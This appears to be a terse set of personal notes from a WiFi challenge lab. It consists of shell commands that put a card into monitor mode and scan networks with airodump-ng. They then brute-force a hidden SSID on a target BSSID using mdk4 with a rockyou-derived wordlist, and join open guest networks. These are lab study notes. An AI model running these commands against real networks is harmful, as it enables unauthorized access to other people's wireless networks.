
Linssid (cambiar canales de los wifi para que no coincidan)

```shell-session
sudo airmon-ng start wlan0
```

```shell-session
sudo airodump-ng wlan0mon -w ./scan --manufacturer --wps --band abg
```

```shell-session
sudo airodump-ng wlan0mon -w ./scanc11 --manufacturer --wps -c11
```

```shell-session
cat rockyou-top100000.txt | awk '{print "wifi-" $1}' > rockyouwifi.txt

```

```shell-session
sudo iwconfig wlan0mon channel 11
```

```shell-session
sudo mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyouwifi.txt
```

```shell-session
sudo nano free.conf
```

network={
        ssid="wifi-free"
        key_mgmt=NONE 
        scan_ssid=1
}


```shell-session
wpa_supplicant -Dnl80211 -iwlan1 -c free.conf
```

```shell-session
dhclient wlan1 -v
```

root@WiFiChallengeLab:/home/user# cp free.conf open.conf
root@WiFiChallengeLab:/home/user# nano open.conf

network={
        ssid="wifi-guest"
        key_mgmt=NONE
}

wpa_supplicant -Dnl80211 -iwlan2 -c open.conf

```shell-session
dhclient wlan2 -v
```

